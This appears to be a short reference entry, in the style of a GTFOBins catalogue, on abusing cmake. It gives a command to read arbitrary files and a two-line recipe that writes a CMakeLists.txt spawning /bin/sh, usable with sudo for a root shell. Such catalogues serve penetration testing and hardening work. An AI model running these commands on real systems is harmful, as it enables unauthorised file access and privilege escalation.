title: cmake
html:
cmake

File Read

Context: sudo, unprivileged

cmake -E cat /path/to/input-file

Shell

Context: sudo, unprivileged

echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt
cmake /path/to/
excerpt: cmake File Read Context: sudo, unprivileged cmake -E cat /path/to/input-file Shell Context: sudo, unprivileged echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt cmake /path
